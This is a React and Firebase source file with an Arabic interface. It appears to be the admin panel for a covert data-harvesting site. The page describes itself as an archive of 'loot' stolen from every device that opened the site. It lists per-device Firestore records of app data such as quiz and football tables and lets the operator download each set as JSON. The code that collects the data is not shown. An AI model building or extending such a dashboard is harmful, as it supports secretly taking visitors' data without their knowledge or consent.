import React, { useState, useEffect } from 'react';
import { getFirestore, collection, getDocs, orderBy, query } from "firebase/firestore";
import { database } from '../App'; // تأكد إنك صدرت الـ db من App.jsx
import { ShieldAlert, User, Calendar, Database, ChevronDown, ChevronUp } from 'lucide-react';

export default function Archive() {
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(true);
  const [expandedId, setExpandedId] = useState(null);

  useEffect(() => {
    const fetchLogs = async () => {
      try {
        const db = getFirestore();
        const q = query(collection(db, "sys_logs_v2"), orderBy("_ts", "desc"));
        const querySnapshot = await getDocs(q);
        const data = querySnapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
        setLogs(data);
      } catch (e) { console.error(e); }
      setLoading(false);
    };
    fetchLogs();
  }, []);

  if (loading) return <div className="text-center py-20 text-white font-black animate-pulse text-2xl">جاري استرجاع الغنائم... 🕵️‍♂️</div>;

  return (
    <div className="min-h-screen bg-slate-950 p-6 text-right" dir="rtl">
      <div className="flex items-center gap-4 mb-10 border-b border-white/10 pb-6">
        <div className="bg-red-600 p-3 rounded-2xl shadow-lg shadow-red-600/20">
          <ShieldAlert size={32} className="text-white" />
        </div>
        <div>
          <h1 className="text-3xl font-black text-white italic">أرشيف السطو السحابي 📁</h1>
          <p className="text-slate-500 font-bold">كل جهاز فتح الموقع، هاي بياناته اللي انلطشت</p>
        </div>
      </div>

      <div className="space-y-6">
        {logs.map((log, index) => (
          <div key={log.id} className="bg-slate-900/50 border border-white/5 rounded-[2.5rem] overflow-hidden transition-all hover:border-purple-500/30">
            {/* Header: User Info */}
            <div 
              onClick={() => setExpandedId(expandedId === log.id ? null : log.id)}
              className="p-6 cursor-pointer flex justify-between items-center bg-white/[0.02]"
            >
              <div className="flex items-center gap-6">
                <div className="bg-slate-800 w-14 h-14 rounded-full flex items-center justify-center text-purple-400 font-black border border-white/5">
                  #{logs.length - index}
                </div>
                <div>
                  <div className="flex items-center gap-2 text-white font-black text-xl">
                    <User size={18} className="text-slate-500" />
                    جهاز معرف بـ: <span className="text-purple-400">{log._uid}</span>
                  </div>
                  <div className="flex items-center gap-2 text-slate-500 text-sm mt-1">
                    <Calendar size={14} />
                    {new Date(log._ts).toLocaleString('ar-EG')}
                  </div>
                </div>
              </div>
              {expandedId === log.id ? <ChevronUp className="text-slate-500" /> : <ChevronDown className="text-slate-500" />}
            </div>

            {/* Content: The Loot */}
            {expandedId === log.id && (
              <div className="p-8 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 bg-black/20">
                {['footballTables', 'quizBellData', 'compensationData', 'quizNumbers'].map(category => (
                  <div key={category} className="bg-slate-800/40 p-6 rounded-[2rem] border border-white/5">
                    <div className="flex items-center gap-2 mb-4 text-slate-400 font-black border-b border-white/5 pb-2 uppercase text-xs tracking-widest">
                      <Database size={14} /> {category}
                    </div>
                    {log.data && log.data[category] ? (
                      <div className="space-y-2">
                        <div className="text-green-400 font-black">موجود ✅</div>
                        <pre className="text-[10px] text-slate-500 bg-black/30 p-3 rounded-xl h-32 overflow-y-auto custom-scrollbar">
                          {JSON.stringify(log.data[category], null, 2)}
                        </pre>
                        <button 
                           onClick={() => {
                             const blob = new Blob([JSON.stringify(log.data[category], null, 2)], {type: 'application/json'});
                             const url = URL.createObjectURL(blob);
                             const a = document.createElement('a');
                             a.href = url; a.download = `${category}_${log._uid}.json`; a.click();
                           }}
                           className="w-full mt-4 bg-purple-600/20 hover:bg-purple-600 text-purple-400 hover:text-white py-2 rounded-xl text-xs font-black transition-all"
                        >
                          تحميل هذا الملف
                        </button>
                      </div>
                    ) : (
                      <div className="text-slate-700 font-bold py-10 text-center">لا توجد بيانات ❌</div>
                    )}
                  </div>
                ))}
              </div>
            )}
          </div>
        ))}
      </div>
    </div>
  );
}